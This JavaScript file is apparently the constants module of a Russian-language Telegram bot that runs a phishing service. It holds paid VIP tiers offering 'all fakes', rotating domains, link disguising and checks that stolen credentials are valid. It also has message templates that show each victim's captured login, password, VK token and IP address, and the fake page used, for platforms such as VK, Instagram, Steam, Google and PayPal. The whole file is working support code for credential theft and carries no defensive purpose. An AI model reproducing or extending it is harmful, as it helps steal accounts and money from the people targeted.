const names = {
    'vk': 'Вконтакте',
    'inst': 'Instagram',
    'ok': 'OK',
    'fb': 'Facebook',
    'tt': 'TikTok',
    'st': 'Steam',
    'wot': 'World of Tanks',
    'mc': 'Minecraft',
    'tg': 'Telegram',
    'sc': 'SocialClub',
    'sp': 'Samp',
    'ft': 'Fortnite',
    'ml': 'Mail',
    'ya': 'Yandex',
    'gl': 'Google',
    'yh': 'Yahoo',
    'tw': 'Twitter',
    'ds': 'Discord',
    'gj': 'Gaijin',
    'ms': 'Microsoft',
    'pr': 'Payeer',
    'psn': 'PSN',
    'pp': 'PayPal',
    'rb': 'Roblox',
    'az': 'Amazon',
    'qw': 'Qiwi',
    'wm': 'Webmoney',
    'ot': 'Разное',  
}
const links = {
    'vk': 'https://vk.com/',
    'inst': 'https://www.instagram.com/',
    'ok': 'https://ok.ru/profile/',
    'fb': 'https://ru-ru.facebook.com/profile.php?id=',
}
const vip = {
    1:{
        name: '🥳 Новичок',
        description: '💻 Подходит для любителей поработать на себя',
        price: 199,
        duration: 7,
        list: [
            '👑 Вам выдается VIP на 7 дней!',
            '',
            '✅ Доступна вкладка "🔗 Мои ссылки"',
            '✅ Доступен приход аккаунтов по ссылкам',
            '✅ Вам доступны все фейки',          
            '✅ Вам доступен общий домен',
            '✅ Вам доступен сменный домен',
            '✅ Видоизменение ссылок',
            '✅ Вам доступен чат VIP',
            '✅ Вам доступны Промо-Коды каждый день!',
            '✅ Уведомления о новом аккаунте',
            '✅ Проверка валидности данных',
            '✅ Связь с Администрацией 24/7!',
            '✅ Проверка на повторяющиеся аккаунты',
            '✅ Заказ личного фейка',    
            '✅ Ваши аккаунты видны только вам!',
            '',
            '✅ Дополнения',
            '            Выгода: 0₽',
            '            Репутация: 0SP',
            '',
            '✅ Администрация советует данный VIP Статус!',
        ]
    },
    2:{
        name: '🤴🏻 Любитель',
        description: '💻 Подходит для любителей поработать на себя',
        price: 399,
        duration: 30,
        list: [
            '👑 Вам выдается VIP на 30 дней!',
            '',
            '✅ Доступна вкладка "🔗 Мои ссылки"',
            '✅ Доступен приход аккаунтов по ссылкам',
            '✅ Вам доступны все фейки',             
            '✅ Вам доступен общий домен',
            '✅ Вам доступен сменный домен',
            '✅ Видоизменение ссылок',
            '✅ Вам доступен чат VIP',
            '✅ Вам доступны Промо-Коды каждый день!',          
            '✅ Уведомления о новом аккаунте',          
            '✅ Проверка валидности данных',
            '✅ Связь с Администрацией 24/7!',
            '✅ Проверка на повторяющиеся аккаунты',
            '✅ Заказ личного фейка',    
            '✅ Ваши аккаунты видны только вам!',
            '',
            '✅ Дополнения',
            '            Выгода: 199₽',
            '            Репутация: +100SP',
            '',
            '✅ Администрация советует данный VIP Статус!',
        ]
    },
    3:{
        name: '🥷🏻 Профи',
        description: '💻 Подходит для любителей поработать на себя',
        price: 499,
        duration: 60,
        list: [
            '👑 Вам выдается VIP на 60 дней!',
            '',
            '✅ Доступна вкладка "🔗 Мои ссылки"',
            '✅ Доступен приход аккаунтов по ссылкам',
            '✅ Вам доступны все фейки',              
            '✅ Вам доступен общий домен',
            '✅ Вам доступен сменный домен',
            '✅ Видоизменение ссылок',
            '✅ Вам доступен чат VIP',
            '✅ Вам доступны Промо-Коды каждый день!',          
            '✅ Уведомления о новом аккаунте',                
            '✅ Проверка валидности данных',
            '✅ Связь с Администрацией 24/7!',
            '✅ Проверка на повторяющиеся аккаунты',
            '✅ Заказ личного фейка',    
            '✅ Ваши аккаунты видны только вам!',
            '',
            '✅ Дополнения',
            '            Выгода: 100₽',
            '            Репутация: +300SP',
            '',
            '✅ Администрация советует данный VIP Статус!',
        ]
    },
    4:{
        name: '🥰 Любимчик',
        description: 'Подходит для продавцов',
        price: 1999,
        duration: 360,
        list: [
            '👑 Вам выдается VIP на 360 дней!',
            '',
            '✅ Доступна вкладка "🔗 Мои ссылки"',
            '✅ Доступен приход аккаунтов по ссылкам',
            '✅ Вам доступны все фейки',               
            '✅ Вам доступен общий домен',
            '✅ Вам доступен сменный домен',
            '✅ Видоизменение ссылок',
            '✅ Вам доступен чат VIP',
            '✅ Вам доступны Промо-Коды каждый день!',          
            '✅ Уведомления о новом аккаунте',                
            '✅ Проверка валидности данных',
            '✅ Связь с Администрацией 24/7!',
            '✅ Проверка на повторяющиеся аккаунты',
            '✅ Заказ личного фейка',    
            '✅ Ваши аккаунты видны только вам!',   
            '',
            '✅ Дополнения',
            '            Выгода: 3000₽',
            '            Репутация: +500SP',
            '',
            '✅ Администрация советует данный VIP Статус!',
        ]
    }
}
const menuList = [
    '👤 Мой профиль', '🔗 Мои ссылки','👥 Мои аккаунты', '👑 VIP Статус','💸 Пополнение', '🎁 Получить бонус','👨‍👩‍👧‍👦 Мои рефералы', '🎟 Промо-Коды','❓ Информация', '📊 О боте'
]
const emptyString = '                                                                                           '
const Menu = [
    ['👤 Мой профиль', '🔗 Мои ссылки'],
    ['👥 Мои аккаунты', '👑 VIP Статус'],
    ['💸 Пополнение', '🎁 Получить бонус'],
    ['👨‍👩‍👧‍👦 Мои рефералы', '🎟 Промо-Коды'],
    ['❓ Информация', '📊 О боте'],
]
const messages = {
    vkMessage: function (name, login, password, token,first_name, last_name, id, friends, followers,online_emoji, online,gifts, ip, fake, pattern,query, date, date2, length, c) {
        return  `Ваши аккаунты ${name}☘️\n\n😻 Login: <code>${login}</code>\n🗝 Password: <code>${password}</code>\n🖇  Token: <code>${token}</code>\n\n🚶Имя: ${first_name}\n🍌Фамилия: ${last_name}\n\n🆔 ID: <a href="https://vk.com/${id}">${id}</a>\n\n🤼 Друзей: ${friends}\n👨‍👩‍👧‍👦 Подписчиков: ${followers}\n\n${online_emoji} Статус: ${online}\n\n🎁 Подарков: ${gifts}\n\n📍 IP: <code>${ip.split(',')[0]}</code>\n🖥 Fake: <code>${fake}</code>\n🚧 Шаблон: <code>${pattern}</code>\n\n🗓 Дата: <code>${date}</code>\n🕰 Время: <code>${date2}</code>\n${c&&length==false?'':`${emptyString}[${c+1}/${length}]`}`
    },
    otherMessage: function (name, login, password, ip, fake, fake2, date, date2,   length, c){
        return `Ваши аккаунты ${name}☘️\n\n😻 Login: <code>${login}</code>\n🗝 Password: <code>${password}</code>\n\n📍 IP: <code>${ip.split(',')[0]}</code>\n🖥 Fake: <code>${fake}</code>\n🚧 Шаблон: ${fake2}\n\n🗓 Дата: <code>${date}</code>\n🕰 Время: <code>${date2}</code>\n${c&&length==false?'':`${emptyString}[${c+1}/${length}]`}`
    }
}
const editModeCaptions = {
    'link': 'Пожалуйста введите вверную ссылку.'
}

const ReplayListAccs = [
    [{
        text: 'Вконтакте',
        callback_data: 'showAccs_vk'
    }, {
        text: 'Instagram',
        callback_data: 'showAccs_inst'
    }],
    [{
        text: 'Одноклассники',
        callback_data: 'showAccs_ok'
    }, {
        text: 'Facebook',
        callback_data: 'showAccs_fb'
    }],
    [{
        text: 'TikTok',
        callback_data: 'showAccs_tt'
    }, {
        text: 'Steam',
        callback_data: 'showAccs_st'
    }],

    [{
        text: 'World of Tanks',
        callback_data: 'showAccs_wot'
    }, {
        text: 'Minecraft',
        callback_data: 'showAccs_mc'
    }],
    [{
        text: 'Telegram',
        callback_data: 'showAccs_tg'
    }, {
        text: 'SocialClub',
        callback_data: 'showAccs_sc'
    }],
    [{
        text: 'Samp',
        callback_data: 'showAccs_sp'
    }, {
        text: 'Fortnite',
        callback_data: 'showAccs_ft'
    }],
    [{
        text: 'Mail',
        callback_data: 'showAccs_ml'
    }, {
        text: 'Yandex',
        callback_data: 'showAccs_ya'
    }],
    [{
        text: 'Google',
        callback_data: 'showAccs_gl'
    }, {
        text: 'Yahoo',
        callback_data: 'showAccs_yh'
    }],
    [{
        text: 'Twitter',
        callback_data: 'showAccs_tw'
    }, {
        text: 'Discord',
        callback_data: 'showAccs_ds'
    }],
    [{
        text: 'Gaijin',
        callback_data: 'showAccs_gj'
    }, {
        text: 'Microsoft',
        callback_data: 'showAccs_ms'
    }],
    [{
        text: 'Payeer',
        callback_data: 'showAccs_pr'
    }, {
        text: 'PSN',
        callback_data: 'showAccs_psn'
    }],
    [{
        text: 'PayPal',
        callback_data: 'showAccs_pp'
    }, {
        text: 'PSN',
        callback_data: 'showAccs_psn'
    }],
    [{
        text: 'Roblox',
        callback_data: 'showAccs_rb'
    }, {
        text: 'Amazon',
        callback_data: 'showAccs_az'
    }],
    [{
        text: 'Qiwi',
        callback_data: 'showAccs_qw'
    }, {
        text: 'Webmoney',
        callback_data: 'showAccs_wm'
    }],
    [{
        text: 'Разное',
        callback_data: 'showAccs_ot'
    }],
]
const ReplayListLinks = [
    [{
        text: 'Вконтакте',
        callback_data: 'showLinks_vk'
    }, {
        text: 'Instagram',
        callback_data: 'showLinks_inst'
    }],
    [{
        text: 'Одноклассники',
        callback_data: 'showLinks_ok'
    }, {
        text: 'Facebook',
        callback_data: 'showLinks_fb'
    }],
    [{
        text: 'TikTok',
        callback_data: 'showLinks_tt'
    }, {
        text: 'Steam',
        callback_data: 'showLinks_st'
    }],
    [{
        text: 'World of Tanks',
        callback_data: 'showLinks_wot'
    }, {
        text: 'Minecraft',
        callback_data: 'showLinks_mc'
    }],
    [{
        text: 'Telegram',
        callback_data: 'showLinks_tg'
    }, {
        text: 'SocialClub',
        callback_data: 'showLinks_sc'
    }],
    [{
        text: 'Samp',
        callback_data: 'showLinks_sp'
    }, {
        text: 'Fortnite',
        callback_data: 'showLinks_ft'
    }],
    [{
        text: 'Mail',
        callback_data: 'showLinks_ml'
    }, {
        text: 'Yandex',
        callback_data: 'showLinks_ya'
    }],
    [{
        text: 'Google',
        callback_data: 'showLinks_gl'
    }, {
        text: 'Yahoo',
        callback_data: 'showLinks_yh'
    }],
    [{
        text: 'Twitter',
        callback_data: 'showLinks_tw'
    }, {
        text: 'Discord',
        callback_data: 'showLinks_ds'
    }],
    [{
        text: 'Gaijin',
        callback_data: 'showLinks_gj'
    }, {
        text: 'Microsoft',
        callback_data: 'showLinks_ms'
    }],
    [{
        text: 'Payeer',
        callback_data: 'showLinks_pr'
    }, {
        text: 'PayPal',
        callback_data: 'showLinks_pp'
    }],
    [{
        text: 'Roblox',
        callback_data: 'showLinks_rb'
    }, {
        text: 'Amazon',
        callback_data: 'showLinks_az'
    }],
    [{
        text: 'Qiwi',
        callback_data: 'showLinks_qw'
    }, {
        text: 'Webmoney',
        callback_data: 'showLinks_wm'
    }],
    [{
        text: 'Разное',
        callback_data: 'showLinks_ot'
    }],
]
module.exports ={names, links, emptyString, ReplayListAccs, ReplayListLinks, vip, Menu, messages, menuList}